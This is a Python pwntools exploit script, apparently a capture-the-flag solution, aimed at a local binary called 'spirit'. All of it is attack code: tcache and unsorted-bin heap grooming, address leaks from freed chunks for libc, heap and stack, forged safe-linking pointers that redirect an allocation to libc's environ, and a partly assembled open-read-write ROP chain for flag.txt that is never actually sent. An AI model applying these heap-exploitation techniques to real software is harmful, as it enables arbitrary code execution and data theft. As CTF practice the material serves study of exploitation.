from pwn import *

elf = context.binary = ELF('./spirit', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.update(
    log_level='debug'
)

c = '''
b* main
c
'''

# p = remote()
p = elf.process()
gdb.attach(p,c)

def order(idx:int, msg: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())
    p.sendafter(b'Name : ', msg)
    sleep(0.1)

def verify(idx:int, msg:bytes, payload:bytes=b'', leaked:bool=False):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())
    p.sendafter(b'please say your name for confirmation : ', msg)
    sleep(0.1)

    if leaked:
        p.sendafter(b'New name : ', payload)
        sleep(0.1)
    
def refund(idx:int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Seat Number : ', f'{idx}'.encode())

def demangle(addr:int) -> int:
    mid = addr >> 12 ^ addr
    ril = mid >> 24 ^ mid
    return ril

def mangle(leak:int, target:int) -> int:
    return leak >> 12 ^ target

# FILL UP TCACHE

order(0, b'HERE')
order(1, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(2, b'HERE')
order(3, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(4, b'HERE')
order(5, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(6, b'HERE')
order(7, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(8, b'HERE')
order(9, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(10, b'HERE')
order(11, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

order(12, b'HERE')
order(13, b'TARGET')

for k in range(4):
    for i in range(14,16):
        order(i, b'a')

refund(0)
refund(2)
refund(4)
refund(6)
refund(8)
refund(10)
refund(12)

order(0,  b'a'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(2,  b'b'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(4,  b'c'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(6,  b'd'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(8,  b'a'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(10, b'b'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
order(12, b'c'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)

refund(1)
refund(3)
refund(5)
refund(7)
refund(9)
refund(11)
refund(13)

# UNSORTED (weirdly)

order(14, b'HERE')
order(15, b'TARGET')

for k in range(2):
    for i in range(0,2):
        order(i, b'\x00')

order(0, p64(0) + p64(0x101))

for k in range(2):
    for i in range(0,2):
        order(i, b'\x00')

order(0, p64(0) + p64(0) + p64(0) + p64(0x101))

for k in range(4): # gap for TOP CHUNK (perfectly okay without it)
    for i in range(0,2):
        order(i, b'\x00')

refund(14)
order(14,  b'a'*0x20+b'\x00'*8+b'\x01\x01'+b'\x00'*6)
refund(15)

# LIBC LEAK

verify(15, b'LIBC LEAK', leaked=False)
p.recvuntil(b'Sorry sir this ticket belongs to ')
libc.address = u64(p.recvline(0).ljust(8, b'\x00'))  - 0x1f6ce0 # libc.sym.main_arena - 96

# HEAP LEAK

refund(0)
verify(0, b'LIBC LEAK', leaked=False)
p.recvuntil(b'Sorry sir this ticket belongs to ')
HEAP_ASLR = u64((b'\x00' + p.recvline(0)).ljust(8, b'\x00'))
HEAP_BASE = eval(hex(HEAP_ASLR -0x200) + '0')

# STACK LEAK

order(0, b'FIRST CHUNK')
order(1, b'TARGET')

refund(1)
refund(0)

verify(0, p64(mangle(HEAP_BASE + 0x2eb0, HEAP_BASE + 0x2b80))[:-2] , p64(mangle(HEAP_BASE + 0x2eb0, libc.sym.environ)), leaked=True)

order(0, b'DUMMY')
order(1, b'\xd8')

verify(1, b'STACK LEAK', leaked=False)
p.recvuntil(b'Sorry sir this ticket belongs to ')
STACK = u64(p.recvuntil(b'\n[+]', drop=True).ljust(8, b'\x00'))

log.info(f"LIBC      : 0x{libc.address:x}")
log.info(f"HEAP BASE : 0x{HEAP_BASE:x}")
log.info(f"HEAP ASLR : 0x{HEAP_ASLR:x}")
log.info(f"STACK     : 0x{STACK:x}")

# ROP ORW PAYLOAD

order(15, b'flag.txt')

rax = libc.address + 0x0000000000040143
rdi = libc.address + 0x00000000000240e5
rsi = libc.address + 0x000000000002573e
rdx = libc.address + 0x0000000000026302
syscall = libc.address + 0x000000000008b9b6
ret = libc.address + 0x0000000000022fd9
flag = HEAP_BASE

rop_part1 = flat(
    rax,
    0x2,
    rdi,
    flag,
    rsi,
    0x0,
)
rop_part2 = flat(
    syscall,
    rax,
    0x0,
    rdi,
    0x3,
    rsi,
)
rop_part3 = flat(
    STACK,
    rdx,
    0x100,
    syscall,
    rax,
    0x01,
)
rop_part4 = flat(
    rdi,
    0x1,
    syscall
)

p.interactive()